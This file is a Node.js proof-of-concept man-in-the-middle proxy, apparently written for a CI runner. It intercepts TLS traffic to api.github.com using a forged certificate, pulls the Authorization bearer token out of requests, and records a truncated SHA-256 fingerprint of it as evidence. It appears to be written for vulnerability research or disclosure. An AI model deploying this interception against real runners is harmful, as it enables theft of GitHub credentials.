#!/usr/bin/env node
/**
 * Localhost CONNECT MITM for api.github.com — fingerprint only in OUT file.
 * Safe harbor: no egress; captures Authorization SHA256 prefix only.
 */
import http from "http";
import net from "net";
import tls from "tls";
import fs from "fs";
import { createHash } from "crypto";

const PORT = parseInt(process.env.MITM_PORT || "18080", 10);
const CERT = process.env.MITM_CERT || "/tmp/mitm.crt";
const KEY = process.env.MITM_KEY || "/tmp/mitm.key";
const OUT =
  process.env.POC_A3_OUT ||
  `${process.env.RUNNER_TEMP || "/tmp"}/poc-a3-env.txt`;
const LOG = process.env.POC_A3_LOG || `${process.env.RUNNER_TEMP || "/tmp"}/poc-a3-mitm.log`;

function log(msg) {
  const line = `${new Date().toISOString()} ${msg}\n`;
  fs.appendFileSync(LOG, line);
  console.log(msg);
}

function writeProof(authHeader) {
  const m = String(authHeader).match(/Bearer\s+(\S+)/i);
  if (!m) return false;
  const fp = createHash("sha256").update(m[1]).digest("hex").slice(0, 16);
  const line = `POC-A3 mitm=1 token_present=true token_sha256_16=${fp} auth_capture=1\n`;
  fs.writeFileSync(OUT, line);
  log(`MITM_CAPTURE fingerprint=${fp}`);
  return true;
}

function relayTls(clientSocket, targetSocket) {
  let buf = "";
  clientSocket.on("data", (chunk) => {
    buf += chunk.toString("binary");
    const idx = buf.indexOf("\r\n\r\n");
    if (idx === -1) return;
    const headerBlock = buf.slice(0, idx);
    buf = buf.slice(idx + 4);
    const authLine = headerBlock
      .split("\r\n")
      .find((l) => /^authorization:/i.test(l));
    if (authLine) writeProof(authLine.split(":").slice(1).join(":").trim());
    targetSocket.write(Buffer.from(headerBlock + "\r\n\r\n", "binary"));
    if (buf.length) targetSocket.write(Buffer.from(buf, "binary"));
    buf = "";
    clientSocket.removeAllListeners("data");
    clientSocket.pipe(targetSocket);
    targetSocket.pipe(clientSocket);
  });
}

const server = http.createServer((req, res) => {
  res.writeHead(400);
  res.end("CONNECT only");
});

server.on("connect", (req, clientSocket, head) => {
  const [host, portStr] = (req.url || "").split(":");
  const port = parseInt(portStr || "443", 10);
  log(`CONNECT ${host}:${port}`);

  const upstream = net.connect(port, host, () => {
    if (host === "api.github.com") {
      clientSocket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
      const secure = new tls.TLSSocket(clientSocket, {
        isServer: true,
        key: fs.readFileSync(KEY),
        cert: fs.readFileSync(CERT),
      });
      const plain = net.connect(port, host, () => {
        const sni = tls.connect({
          socket: plain,
          servername: host,
          rejectUnauthorized: true,
        });
        relayTls(secure, sni);
        sni.on("error", (e) => log(`upstream tls error ${e.message}`));
      });
      plain.on("error", (e) => log(`plain error ${e.message}`));
      secure.on("error", (e) => log(`client tls error ${e.message}`));
      return;
    }

    clientSocket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
    if (head?.length) upstream.write(head);
    clientSocket.pipe(upstream);
    upstream.pipe(clientSocket);
  });

  upstream.on("error", (e) => {
    log(`upstream error ${e.message}`);
    clientSocket.end();
  });
});

server.listen(PORT, "127.0.0.1", () => {
  log(`MITM proxy listening 127.0.0.1:${PORT} out=${OUT}`);
});
